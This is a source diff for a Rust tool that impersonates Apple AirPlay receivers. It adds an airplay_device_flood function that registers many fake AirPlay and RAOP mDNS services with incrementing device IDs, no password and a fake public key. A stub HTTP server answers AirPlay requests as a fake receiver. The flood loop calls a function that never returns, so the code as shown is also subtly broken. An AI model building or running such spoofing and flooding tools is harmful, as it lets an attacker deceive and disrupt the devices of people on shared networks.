@@ -1,13 +1,28 @@
 use mdns_sd::{ServiceDaemon, ServiceInfo};
 use std::collections::HashMap;
-use std::net::Ipv4Addr;
 use std::time::Duration;
 
-fn register_airplay_device(device_name: &str, device_id: &str, ip: &str, port: u16) -> Result<(), Box<dyn std::error::Error>> {
+use crate::utils;
+
+pub fn airplay_device_flood(name: &str, amount: usize) {
+    let mut mac = utils::MacAddr::new_zeroed();
+    for i in 0..amount {
+        mac.increment();
+        let _ = register_airplay_device(&format!("{}{}", name, i), &mac, "192.168.0.1", 8000);
+    }
+}
+
+fn register_airplay_device(
+    device_name: &str,
+    device_id: &utils::MacAddr,
+    ip: &str,
+    port: u16,
+) -> Result<(), Box<dyn std::error::Error>> {
+    let device_id = &device_id.as_string();
     let mdns = ServiceDaemon::new()?;
-    
+
     let hostname = format!("{}.local.", device_name.replace(" ", "-"));
-    
+
     let airplay_service = ServiceInfo::new(
         "_airplay._tcp.local.",
         device_name,
@@ -16,7 +31,7 @@ fn register_airplay_device(device_name: &str, device_id: &str, ip: &str, port: u
         port,
         create_airplay_txt_records(device_name, device_id),
     )?;
-    
+
     let raop_instance_name = format!("{}@{}", device_id, device_name);
     let raop_service = ServiceInfo::new(
         "_raop._tcp.local.",
@@ -26,16 +41,19 @@ fn register_airplay_device(device_name: &str, device_id: &str, ip: &str, port: u
         port,
         create_raop_txt_records(device_name, device_id),
     )?;
-    
+
     // Register both services
     mdns.register(airplay_service)?;
     mdns.register(raop_service)?;
-    
-    println!("AirPlay device '{}' registered at {}:{}", device_name, ip, port);
+
+    println!(
+        "AirPlay device '{}' registered at {}:{}",
+        device_name, ip, port
+    );
     println!("Services registered:");
     println!("  - _airplay._tcp.local");
     println!("  - _raop._tcp.local");
-    
+
     // Keep services running
     loop {
         std::thread::sleep(Duration::from_secs(30));
@@ -44,7 +62,7 @@ fn register_airplay_device(device_name: &str, device_id: &str, ip: &str, port: u
 
 fn create_airplay_txt_records(device_name: &str, device_id: &str) -> HashMap<String, String> {
     let mut records = HashMap::new();
-    
+
     // Essential AirPlay TXT records that iOS looks for
     records.insert("deviceid".to_string(), device_id.to_string());
     records.insert("features".to_string(), "0x4A7FDFD5,0xBC155FDE".to_string()); // Video + Audio support
@@ -54,14 +72,17 @@ fn create_airplay_txt_records(device_name: &str, device_id: &str) -> HashMap<Str
     records.insert("srcvers".to_string(), "220.68".to_string()); // Source version
     records.insert("vv".to_string(), "2".to_string()); // Volume control version
     records.insert("pw".to_string(), "false".to_string()); // No password required
-    records.insert("pk".to_string(), "b07727d6f6cd6e08b58ede525ec3cdeaa252ae9e".to_string()); // Public key (fake)
-    
+    records.insert(
+        "pk".to_string(),
+        "b07727d6f6cd6e08b58ede525ec3cdeaa252ae9e".to_string(),
+    ); // Public key (fake)
+
     records
 }
 
 fn create_raop_txt_records(device_name: &str, device_id: &str) -> HashMap<String, String> {
     let mut records = HashMap::new();
-    
+
     // RAOP (Remote Audio Output Protocol) TXT records
     records.insert("txtvers".to_string(), "1".to_string());
     records.insert("ch".to_string(), "2".to_string()); // Stereo channels
@@ -78,20 +99,20 @@ fn create_raop_txt_records(device_name: &str, device_id: &str) -> HashMap<String
     records.insert("vs".to_string(), "220.68".to_string()); // Version string
     records.insert("am".to_string(), "AppleTV3,2".to_string()); // Audio model
     records.insert("ek".to_string(), "1".to_string()); // Encryption key
-    
+
     records
 }
 
 // HTTP server to handle AirPlay protocol requests
 // Not really sure if I could get any use from this?
-use std::net::TcpListener;
 use std::io::{Read, Write};
+use std::net::TcpListener;
 use std::thread;
 
 fn start_airplay_http_server(port: u16) {
     let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).unwrap();
     println!("AirPlay HTTP server listening on port {}", port);
-    
+
     for stream in listener.incoming() {
         match stream {
             Ok(stream) => {
@@ -106,11 +127,11 @@ fn start_airplay_http_server(port: u16) {
 
 fn handle_client(mut stream: std::net::TcpStream) {
     let mut buffer = [0; 4096];
-    
+
     if let Ok(size) = stream.read(&mut buffer) {
         let request = String::from_utf8_lossy(&buffer[..size]);
         println!("Received request: {}", request.lines().next().unwrap_or(""));
-        
+
         // Route AirPlay requests
         if request.contains("GET /info") {
             send_server_info(&mut stream);
@@ -164,7 +185,12 @@ fn send_stop_response(stream: &mut std::net::TcpStream) {
 }
 
 fn send_scrub_response(stream: &mut std::net::TcpStream) {
-    send_response(stream, "200 OK", "text/plain", "duration: 0.000000\nposition: 0.000000");
+    send_response(
+        stream,
+        "200 OK",
+        "text/plain",
+        "duration: 0.000000\nposition: 0.000000",
+    );
 }
 
 fn send_volume_response(stream: &mut std::net::TcpStream) {
@@ -173,7 +199,8 @@ fn send_volume_response(stream: &mut std::net::TcpStream) {
 }
 
 fn send_default_response(stream: &mut std::net::TcpStream) {
-    let html = "<html><body><h1>AirPlay Device</h1><p>Fake AirPlay receiver running</p></body></html>";
+    let html =
+        "<html><body><h1>AirPlay Device</h1><p>Fake AirPlay receiver running</p></body></html>";
     send_response(stream, "200 OK", "text/html", html);
 }
 
@@ -184,8 +211,11 @@ fn send_response(stream: &mut std::net::TcpStream, status: &str, content_type: &
          Content-Length: {}\r\n\
          Server: AirTunes/220.68\r\n\
          Connection: close\r\n\r\n{}",
-        status, content_type, body.len(), body
+        status,
+        content_type,
+        body.len(),
+        body
     );
-    
+
     let _ = stream.write_all(response.as_bytes());
 }
